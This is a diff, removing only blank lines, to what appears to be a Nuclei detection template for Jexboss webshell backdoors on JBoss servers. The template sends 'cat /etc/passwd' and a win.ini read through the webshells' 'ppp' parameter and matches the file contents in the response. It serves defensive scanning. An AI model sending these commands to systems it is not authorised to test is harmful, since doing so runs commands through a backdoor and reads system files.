@@ -1,5 +1,4 @@
 id: jexboss-backdoor
-
 info:
   name: Jexboss Backdoor Webshell
   author: UnkL4b
@@ -10,7 +9,6 @@ info:
   metadata:
     verified: true
   tags: backdoor,jboss,rce
-
 requests:
   - method: GET
     path:
@@ -18,12 +16,10 @@ requests:
       - "{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode('{{command}}')}}"
       - "{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode('{{command}}')}}"
       - "{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode('{{command}}')}}"
-
     payloads:
       command:
         - "cat /etc/passwd"
         - "type C:\\/Windows\\/win.ini"
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
@@ -33,7 +29,6 @@ requests:
           - "root:.*:0:0:"
           - "\\[(font|extension|file)s\\]"
         condition: or
-
       - type: word
         part: header
         words:
